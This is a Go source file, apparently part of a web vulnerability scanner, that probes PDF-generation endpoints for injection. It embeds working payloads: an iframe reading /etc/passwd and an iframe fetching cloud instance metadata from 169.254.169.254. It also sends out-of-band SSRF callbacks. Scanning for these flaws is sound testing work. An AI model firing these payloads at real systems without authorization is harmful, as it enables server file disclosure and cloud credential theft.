package modules

import (
	"bytes"
	"compress/zlib"
	"context"
	"fmt"
	"io"
	"strings"
)

var pdfParamHints = []string{
	"pdf", "html", "content", "template", "report", "invoice", "document",
	"render", "convert", "export", "print", "body", "page",
}

func (r *Runner) runPDFInjection(ctx context.Context, target ScanTarget) []ModuleFinding {
	if ok, reason := r.shouldRunModule("pdf_injection", target); !ok {
		r.emitSkip("pdf_injection", target, reason)
		return nil
	}

	lowerParam := strings.ToLower(target.Parameter)
	isCandidate := false
	for _, hint := range pdfParamHints {
		if strings.Contains(lowerParam, hint) {
			isCandidate = true
			break
		}
	}
	if !isCandidate && target.Parameter != "" {
		// Also allow if endpoint URL contains pdf/render
		lowerURL := strings.ToLower(target.EndpointURL)
		if strings.Contains(lowerURL, "pdf") || strings.Contains(lowerURL, "render") || strings.Contains(lowerURL, "export") {
			isCandidate = true
		}
	}
	if !isCandidate {
		return nil
	}

	baseline, baselineErr := r.cachedEmptyProbe(ctx, target)
	if baselineErr != nil {
		return nil
	}

	var out []ModuleFinding

	// Test 1: Local File Read via <iframe> in PDF
	lfiPayload := `<iframe src="file:///etc/passwd"></iframe>`
	lfiRR, err := r.probe(ctx, target, lfiPayload)
	if err == nil && lfiRR.Response.StatusCode == 200 {
		body := pdfSearchableContent(lfiRR.Response.Body)
		if strings.Contains(body, "root:x:0:0:") || strings.Contains(body, "[boot loader]") {
			signal := "pdf_local_file_read"
			p := defaultPayload("pdf_injection", signal, lfiPayload, signal)
			f := r.verifyAndBuild(ctx, "pdf_injection", target, p, baseline, lfiRR, signal, false, false, "", "")
			if f != nil {
				f.Severity = "critical"
				f.Title = "Server-Side PDF Generation Local File Inclusion (LFI)"
				f.Description = fmt.Sprintf("PDF generation endpoint '%s' rendered local system files via iframe injection in parameter '%s'.", target.EndpointURL, target.Parameter)
				r.recordFinding(ctx, &out, f, "pdf_injection", signal)
				return out
			}
		}
	}

	// Test 2: Cloud Metadata SSRF via <iframe> / <img> in PDF
	metaPayload := `<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>`
	metaRR, mErr := r.probe(ctx, target, metaPayload)
	if mErr == nil && metaRR.Response.StatusCode == 200 {
		body := pdfSearchableContent(metaRR.Response.Body)
		if strings.Contains(body, "ami-id") || strings.Contains(body, "instance-id") || strings.Contains(body, "local-hostname") {
			signal := "pdf_metadata_ssrf"
			p := defaultPayload("pdf_injection", signal, metaPayload, signal)
			f := r.verifyAndBuild(ctx, "pdf_injection", target, p, baseline, metaRR, signal, false, false, "", "")
			if f != nil {
				f.Severity = "critical"
				f.Title = "Server-Side PDF Generation Cloud Metadata SSRF"
				f.Description = fmt.Sprintf("PDF generation endpoint '%s' fetched and rendered cloud instance metadata via parameter '%s'.", target.EndpointURL, target.Parameter)
				r.recordFinding(ctx, &out, f, "pdf_injection", signal)
				return out
			}
		}
	}

	// Test 3: OAST Out-of-band SSRF
	if r.cfg.EnableOAST && r.oast != nil {
		if oastURL := strings.TrimSpace(r.oastURL(ctx, "pdf-ssrf", target, "pdf_injection")); oastURL != "" {
			r.sendOASTProbe(ctx, target, oastURL)
		}
		if htmlOASTURL := strings.TrimSpace(r.oastURL(ctx, "pdf-html-ssrf", target, "pdf_injection")); htmlOASTURL != "" {
			if callback := appendOASTURLPath(htmlOASTURL, "pdf-ssrf"); callback != "" {
				r.sendOASTProbe(ctx, target, fmt.Sprintf(`<img src="%s">`, callback))
			}
		}
	}

	return out
}

func pdfInjectionSignalConfirmed(signal, body string, status int) bool {
	if status != 200 {
		return false
	}
	body = pdfSearchableContent(body)
	switch signal {
	case "pdf_local_file_read":
		return strings.Contains(body, "root:x:0:0:") || strings.Contains(body, "[boot loader]")
	case "pdf_metadata_ssrf":
		return strings.Contains(body, "ami-id") || strings.Contains(body, "instance-id") ||
			strings.Contains(body, "local-hostname")
	default:
		return false
	}
}

func pdfSearchableContent(body string) string {
	raw := []byte(body)
	searchable := append([]byte(nil), raw...)
	for offset := 0; offset < len(raw); {
		rel := bytes.Index(raw[offset:], []byte("stream"))
		if rel < 0 {
			break
		}
		streamAt := offset + rel
		headerAt := streamAt - 512
		if headerAt < 0 {
			headerAt = 0
		}
		dataAt := streamAt + len("stream")
		if dataAt < len(raw) && raw[dataAt] == '\r' {
			dataAt++
		}
		if dataAt < len(raw) && raw[dataAt] == '\n' {
			dataAt++
		}
		endRel := bytes.Index(raw[dataAt:], []byte("endstream"))
		if endRel < 0 {
			break
		}
		endAt := dataAt + endRel
		if bytes.Contains(raw[headerAt:streamAt], []byte("/FlateDecode")) {
			compressed := bytes.TrimRight(raw[dataAt:endAt], "\r\n")
			reader, err := zlib.NewReader(bytes.NewReader(compressed))
			if err == nil {
				decoded, readErr := io.ReadAll(io.LimitReader(reader, 4<<20))
				_ = reader.Close()
				if readErr == nil {
					searchable = append(searchable, '\n')
					searchable = append(searchable, decoded...)
				}
			}
		}
		offset = endAt + len("endstream")
	}
	return string(searchable)
}
